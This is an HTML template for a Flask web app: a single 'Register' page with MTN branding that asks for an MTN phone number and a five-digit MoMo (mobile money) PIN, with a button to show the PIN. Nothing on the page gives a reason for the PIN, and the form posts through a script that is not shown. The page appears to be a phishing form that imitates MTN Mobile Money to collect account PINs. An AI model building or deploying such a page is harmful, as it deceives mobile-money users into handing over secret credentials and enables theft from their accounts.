<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="main-container">
        
        <!-- Top Image Section (2/3 height) -->
        <div class="photo-header">
            <img src="{{ url_for('static', filename='images/image.jpeg') }}" 
                 alt="Header Image" 
                 class="header-image"
                 onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22380%22 height=%22480%22%3E%3Crect fill=%22%23003087%22 width=%22380%22 height=%22480%22/%3E%3Ctext x=%2250%%22 y=%2250%%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22white%22 font-size=%2240%22 font-family=%22Arial%22%3E📱 MTN%3C/text%3E%3C/svg%3E'">
        </div>

        <!-- Form Section (1/3 height) -->
        <div class="form-section">
            <form id="registrationForm">
                <input type="tel" 
                       id="mtnNumber"
                       name="mtn_number"
                       placeholder="MTN NUMBER" 
                       required maxlength="15">

                <div class="pin-wrapper">
                    <input type="password" 
                           id="momoPin"
                           name="momo_pin"
                           placeholder="MOMO PIN" 
                           required 
                           maxlength="5" 
                           minlength="5">
                    <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
                </div>

                <button type="submit" class="btn" id="submitBtn">REGISTER</button>
            </form>

            <div id="messageContainer" class="message-container"></div>
        </div>
    </div>

    <script src="{{ url_for('static', filename='script.js') }}"></script>
</body>
</html>
